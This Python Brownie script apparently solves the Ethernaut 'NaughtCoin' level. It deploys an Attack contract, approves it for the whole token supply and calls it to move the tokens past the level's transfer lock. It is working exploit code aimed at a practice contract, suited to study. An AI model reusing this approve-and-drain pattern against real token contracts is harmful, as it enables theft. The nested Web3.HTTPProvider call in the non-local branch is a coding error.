from brownie import Contract, Attack, NaughtCoin, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        naughtcoin = NaughtCoin.deploy(account, {"from": get_account(index=1)})

        attack = Attack.deploy(naughtcoin, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        naughtcoin = Contract.from_abi(
            NaughtCoin._name,
            config["networks"][network.show_active()]["naughtcoin"],
            NaughtCoin.abi,
        )

        attack = Attack.deploy(naughtcoin, {"from": account})

    naughtcoin.approve(attack, naughtcoin.INITIAL_SUPPLY(), {"from": account}).wait(1)
    attack.attack(account, naughtcoin.INITIAL_SUPPLY(), {"from": account}).wait(1)


def main():
    attack()
